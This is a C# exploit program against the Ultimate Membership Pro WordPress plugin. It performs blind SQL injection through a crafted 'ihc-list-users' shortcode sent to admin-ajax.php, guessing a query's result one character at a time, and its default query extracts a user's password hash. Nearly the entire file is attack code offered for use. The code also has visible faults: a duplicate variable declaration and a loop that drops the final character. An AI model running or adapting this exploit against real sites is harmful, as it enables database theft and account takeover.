using System;
using System.IO;
using System.Net;
using System.Text;

/*
 *  Original Author: wp0Day.com
 *	Author: Etor Madiv
 *  Contact us: etormadiv@gmail.com
 *
 */

namespace WordPressPluginExploit
{
	public class Program
	{
		public static void Main()
		{
			string webSite = "http://www.target.tld/";
			string sqlQuery = "select user_pass from wp_users limit 1";
			string sqlQuery = "select table_name from information_schema.tables where table_name like '%users' limit 1";
			UltimateMembershipProExploit exploit = new UltimateMembershipProExploit(webSite);
			exploit.Execute(sqlQuery);
		}
	}
	
	public class UltimateMembershipProExploit
	{
		private string umpWebsite;
		
		private int maxLength = 100;
		
		private string charset = "etaoinsrhdluc@*_$1234567890.mfywgpbvkxqjzETAOINSRHDLUCMFYWGPBVKXQJZ";
		
		public UltimateMembershipProExploit(string webSite)
		{
			umpWebsite = webSite;
		}
		
		private bool isTrue(string query)
		{
			var hwr = (HttpWebRequest) WebRequest.Create(umpWebsite + "wp-admin/admin-ajax.php");
			hwr.Method = "POST";
			
			hwr.ContentType = "application/x-www-form-urlencoded";
			
			string data = "action=ihc_preview_user_listing&shortcode=[ihc-list-users filter_by_level=\"1\" levels_in=\"') union all select (SELECT CASE WHEN ( " + query + " ) then 1 else 1*(select table_name from information_schema.tables) end);#\" theme=\"ihc-theme_1\" ]";

			hwr.ContentLength = data.Length;
			
			byte[] dataBytes = Encoding.ASCII.GetBytes(data);
			using (var stream = hwr.GetRequestStream())
			{
				stream.Write(dataBytes, 0, dataBytes.Length);
			}
			
			using (var response = hwr.GetResponse().GetResponseStream())
			{
				var sr = new StreamReader(response);
				return sr.ReadToEnd().Contains("ihc_public_list_users_");
			}
		}
		
		private int findQueryResultLength(string query)
		{
			for(int i=1; i< maxLength; i++)
			{
				if( isTrue( "(select char_length( ("+ query +") ) = " + i + " )" ) )
				{
					Console.WriteLine("[INFO]: Length found, it is " + i);
					return i;
				}
			}
			Console.WriteLine("[FAILURE]: The length maybe bigger than " + maxLength);
			return -1;
		}
		
		
		public void Execute(string query)
		{
			int length = findQueryResultLength(query);
			
			if ( length > 0 )
			{
				string queryResult = "";
				
				for(int i=1; i<length; i++)
				{
					bool got = false;
					for(int j=0; j<charset.Length; j++)
					{
						try
						{
							if( isTrue("SELECT substr((" + query + ") FROM " + i + " FOR 1) = '" + charset[j] + "' ") )
							{
								queryResult += charset[j];
								Console.WriteLine("[INFO]: Found new char["+ i +"] = " + charset[j]);
								got = true;
								break;
							}
						}
						catch
						{
							Console.WriteLine("[RETRYING]: Repeat " + i + " test...");
							j--;
							continue;
						}
					}
					if(!got)
						queryResult += "?";
				}
				
				Console.WriteLine("[SUCCESS]: Executed query result: " + queryResult);
			}
		}
	}
}